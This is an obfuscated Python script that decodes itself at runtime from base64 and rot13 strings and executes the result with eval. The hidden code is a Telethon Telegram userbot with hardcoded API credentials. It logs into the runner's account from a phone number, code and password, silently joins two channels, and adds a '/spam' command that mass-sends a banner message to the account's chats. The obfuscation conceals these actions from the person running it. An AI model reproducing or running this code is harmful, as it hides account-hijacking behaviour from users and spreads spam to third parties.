import base64, codecs
magic = 'ZnJvbSB0ZWxldGhvbi5zeW5jIGltcG9ydCBUZWxlZ3JhbUNsaWVudA0KZnJvbSB0ZWxldGhvbi50bC5mdW5jdGlvbnMubWVzc2FnZXMgaW1wb3J0IEdldERpYWxvZ3NSZXF1ZXN0DQpmcm9tIHRlbGV0aG9uLnRsLnR5cGVzIGltcG9ydCBJbnB1dFBlZXJFbXB0eSwgSW5wdXRQZWVyQ2hhbm5lbCwgSW5wdXRQZWVyVXNlcg0KZnJvbSB0ZWxldGhvbi5lcnJvcnMucnBjZXJyb3JsaXN0IGltcG9ydCBQZWVyRmxvb2RFcnJvciwgVXNlclByaXZhY3lSZXN0cmljdGVkRXJyb3INCmZyb20gdGVsZXRob24udGwuZnVuY3Rpb25zLmNoYW5uZWxzIGltcG9ydCBJbnZpdGVUb0NoYW5uZWxSZXF1ZXN0DQpmcm9tIHRlbGV0aG9uLnRsLmZ1bmN0aW9ucy5tZXNzYWdlcyBpbXBvcnQgR2V0SGlzdG9yeVJlcXVlc3QNCmZyb20gdGVsZXRob24gaW1wb3J0IFRlbGVncmFtQ2xpZW50LCBldmVudHMNCmZyb20gdGVsZXRob24uZXJyb3JzIGltcG9ydCBTZXNzaW9uUGFzc3dvcmROZWVkZWRFcnJvcg0KZnJvbSB0ZWxldGhvbi5lcnJvcnMgaW1wb3J0IEZsb29kV2FpdEVycm9yDQpmcm9tIHRlbGV0aG9uLnRsLmZ1bmN0aW9ucy5jaGFubmVscyBpbXBvcnQgSm9pbkNoYW5uZWxSZXF1ZXN0DQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwDQppbXBvcnQgZ2V0cGFzcw0KaW1wb3J0IHN5cw0KaW1wb3J0IHRyYWNlYmFjaw0KaW1wb3J0IHRpbWUNCmltcG9ydCBsb2dnaW5nDQppbXBvcnQgcmFuZG9tDQoNCg0KYXBpX2lkID0gMTI3MTc4NQ0KYXBpX2hhc2ggPSAnOGFhNzYyYjQxYjE5NDk1MDgwMTc5OWI3YzBiOTFhYTgnDQpwcmludCgi4paT4paI4paI4paI4paI4paI4paEIOKWk+KWiOKWiOKWiOKWiOKWiCDiloTiloTiloQgICAgICDilpPilojilojilojilojilojiloQgIOKWhOKWhOKWhOKWhCAgICDilpLilojilojilojilojilogg4paT4paI4paIICAg4paI4paI4paTIikNCnByaW50KCLilpLilojilojiloAg4paI4paI4paM4paT4paIICAg4paA4paS4paI4paI4paI4paI4paEICAgIOKWkuKWiOKWiO'
love = 'XJtPQvybwvybwvybmvycCvybwvybwvybwvybwvybwvybDt4cnF4cnV4cnV4cnFVPQvybwvybwvycYvycYvybwvybttVBXJvBXJvBXJxvVcQDcjpzyhqPtv4cnE4cnV4cnVVPNt4cnV4cnZ4cnF4cnV4cnV4cnVVPQvycYvybwvybttVBXJtBXJvBXJuPNt4cnE4cnV4cnVVPNt4cnV4cnZ4cnF4cnV4cnV4cnFVBXJuBXJvBXJvBXJxhXJvBXJvBXJxFNt4cnV4cnV4cnFVBXJxhXJvBXJvPQvybwvybwvycRvXD0XpUWcoaDbVhXJxrXJx+XJvBXJuPNtVBXJwBXJxhXJx+XJvPNt4cnR4cnE4cnV4cnV4cnR4cnR4cnR4cnR4cnV4cnVVBXJxrXJx+XJvBXJuPNtVBXJwBXJxhXJvBXJvBXJxrXJvBXJtPNt4cnF4cnV4cnVVPNt4cnV4cnV4cnEVBXJxFQvycQvybwvybwvycCvycRvXD0XpUWcoaDbVhXJxrXJxhXJvBXJvBXJvBXJvBXJxlQvycUvycYvybwvybwvybwvybwvycYvycCvybttVPQvycCvybwvybwvycYvycUvycYvybwvybwvybwvybwvycZt4cnE4cnG4cnVVPQvybQvybwvycCvycRt4cnV4cnV4cnV4cnV4cnG4cnF4cnEVBXJxFQvybwvybwvycYvycCvycRvXD0XpUWcoaDbVvQvycYvycYvycZtVBXJxvQvycUvycRt4cnF4cnEVBXJxrXJxhXJxvNtVBXJx+XJxhXJvBXJxFQvycYvycYvycZtVBXJxvQvycUvycYvycCvybwvybwvybwvybQvycYvycRt4cnF4cnE4cnF4cnE4cnF4cnEVPNt4cnV4cnV4cnF4cnF4cnFVvxAPaOlnJ50XPVt4cnEVBXJxvNt4cnFVPQvycRt4cnEVPQvycRt4cnFVPNt4cnF4cnFVBXJxFQvycRt4cnFVPQvycVt4cnF4cnE4cnFVPNt4cnEVPNt4cnEVBXJxvQvycYvycRt4cnG4cnV4cnVVBXJxrXJxhXJxFVcQDcjpzyhqPtvVBXJxFQvycRtVBXJxFNtVPQvycRtVPNt4cnEVPNt4cnFVPNtVBXJxFQvycRtVBXJxFNt4cnEVPNtVBXJxFQvycRt4cnEVBXJxFQvycVtVBXJxvQvycVt4cnE4cnEVPVcQDcjpzyhqPtvVPNt4cnEVPNtVPNtVBXJxFNt4cnEVPNtVPQvycRtVBXJxFNtVBXJxFNtVPNt4cnEVPNtVPNtVPNtVBXJxFQvycRtVBXJxFQvycRtVPNtVvxAPaOlnJ50'
god = 'KCIg4paRICAgICAgICAgICAgICAgICAgICAgICDilpEgICAgICAgICAgICDilpEgICAgICAgICAg4paRIOKWkSAgICBcblxudC5tZS9uaW1kYV90bSAmIHQubWUvYmFyb24iKQ0KcGhvbmUgPSBpbnB1dCgiWW91ciBQaG9uZSA6ICIpDQoNCg0KY2xpZW50ID0gVGVsZWdyYW1DbGllbnQocGhvbmUsIGFwaV9pZCwgYXBpX2hhc2gpDQpjbGllbnQuY29ubmVjdCgpDQoNCmlmIG5vdCBjbGllbnQuaXNfdXNlcl9hdXRob3JpemVkKCk6DQogICAgY2xpZW50LnNlbmRfY29kZV9yZXF1ZXN0KHBob25lKQ0KICAgIHRyeToNCiAgICAgICAgY2xpZW50LnNpZ25faW4oY29kZT1pbnB1dCgnRW50ZXIgY29kZTogJykpDQogICAgZXhjZXB0IFNlc3Npb25QYXNzd29yZE5lZWRlZEVycm9yOg0KICAgICAgICBjbGllbnQuc2lnbl9pbihwYXNzd29yZD1pbnB1dCgncGFzc3dvcmQgY29kZTogJykpDQpjbGllbnQucGFyc2VfbW9kZSA9ICdodG1sJyAgICAgICAgIA0KcHJpbnQoImJvdCBvbiIpDQp0cnk6DQogICAgY2xpZW50KEpvaW5DaGFubmVsUmVxdWVzdCgnYmFyb24nKSkNCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICBwcmludChlKQ0KdHJ5Og0KICAgIGNsaWVudChKb2luQ2hhbm5lbFJlcXVlc3QoJ3RsX2hwJykpDQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgcHJpbnQoZSkNCiAgICANCmFkbWluID0gW10gDQptZSA9ICBjbGllbnQuZ2V0X21lKCkNCnByaW50KG1lLmlkKQ0KYWRtaW4uYXBwZW5kKG1lLmlkKQ0KQGNsaWVudC5vbihldmVudHMuTmV3TWVzc2FnZShwYXR0ZXJuPXInL3NwYW0nKSkNCmFzeW5jIGRlZiByb3NlKGV2ZW50KToNCiAgICBpZiBldmVudC5zZW5kZXJfaWQgaW4gYWRtaW46DQogICAgICAgIG51bWJlcnNwYW0gPSBldmVudC50ZXh0LnNwbGl0KCIgIikNCiAgICAgICAgaWYgbnVtYmVyc3BhbVsxXSA9PSAic2V0IjoNCiAgICAgICAgICAgIGdsb2JhbCBiYW5lcg0KICAgICAgICAgICAgDQogICAgICAgICAgICBiYW5lciA9IGF3YWl0IGNsaWVudC5nZX'
destiny = 'EsoJImp2SaMKZbMKMyoaDhL2uuqS9cMPkcMUZ9MKMyoaDhpzIjoUysqT9soKAaK2yxXD0XVPNtVPNtVPNtVPNtLzShMKVtCFOvLJ5ypv5gMKAmLJqyQDbtVPNtVPNtVPNtVPOuq2ScqPOyqzIhqP5lMKOfrFtvp2I0MJDvXD0XVPNtVPNtVPOyoUAyBt0XVPNtVPNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVPNtVPNtVT51oJWypaAjLJ0tCFOcoaDboaIgLzIlp3OuoIfkKFxAPvNtVPNtVPNtVPNtVPNtVPOzo3VtnFOcovOlLJ5aMFuhqJ1vMKWmpTSgXGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtnJLtLzShMKVtCG0tGz9hMGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOjpzyhqPucXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTS3LJy0VTAfnJIhqP5mMJ5xK21yp3AuM2HbMKMyoaDhL2uuqS9cMPjvqP5gMIkvLKWioykhVvgmqUVbnFfkXFxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTIfp2H6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtpUWcoaDbnFxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOuq2ScqPOwoTyyoaDhp2IhMS9gMKAmLJqyXTI2MJ50YzAbLKEsnJDfLzShMKVeVykhVvgmqUVbnFfkXFxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtMKuwMKO0VRMfo29xI2ScqRIlpz9lVTSmVTI4Bt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtpUWcoaDbW0Mfo29xVUqunKDtBvpfMKthp2Iwo25xplxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUEcoJHhp2kyMKNbMKthp2Iwo25xplxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtMKuwMKO0VRI4L2IjqTyiovOuplOyrQbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUOlnJ50XTI4XD0XVPNtVPNtVPNtVPNtMKuwMKO0VRI4L2IjqTyiovOuplOyBt0XVPNtVPNtVPNtVPNtVPNtVUOlnJ50XTHcQDbtVPNtVPNtVPNtVPNtVPNtQDbtVPNtVPNtVN0XVPNtVN0XVPNtVN0XL2kcMJ50YaA0LKW0XPxAPzAfnJIhqP5lqJ5sqJ50nJksMTymL29hozIwqTIxXPxtVPNtVN=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
